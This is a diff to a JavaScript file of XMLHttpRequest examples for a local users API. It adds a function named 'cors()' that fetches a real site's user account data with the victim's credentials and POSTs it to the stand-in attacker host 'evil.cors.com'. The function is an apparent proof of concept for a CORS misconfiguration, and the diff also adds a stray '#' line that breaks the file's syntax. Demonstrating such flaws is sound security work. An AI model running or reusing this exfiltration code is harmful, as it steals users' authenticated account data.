@@ -1,3 +1,23 @@
+function cors() 
+{
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function () 
+    {
+        if (this.readyState == 4 && this.status == 200) 
+        {
+            var a = this.responseText; // Sensitive data from niche.co about user account
+            document.getElementById("demo").innerHTML = a;
+            xhttp.open("POST", "http://evil.cors.com", true); // Sending that data to Attacker's website
+            xhttp.withCredentials = true;
+            console.log(a);
+            xhttp.send("data=" + a);
+        }
+    };
+    xhttp.open("GET", "https://www.niche.co/api/v1/users/*******", true);
+    xhttp.withCredentials = true;
+    xhttp.send();
+}
+
 // Get all users
 var url  = "http://localhost:8080/api/v1/users";
 var xhr  = new XMLHttpRequest()
@@ -11,7 +31,7 @@ xhr.onload = function () {
 	}
 }
 xhr.send(null);
-
+#############################################################################
 
 // Get a user
 var url  = "http://localhost:8080/api/v1/users";
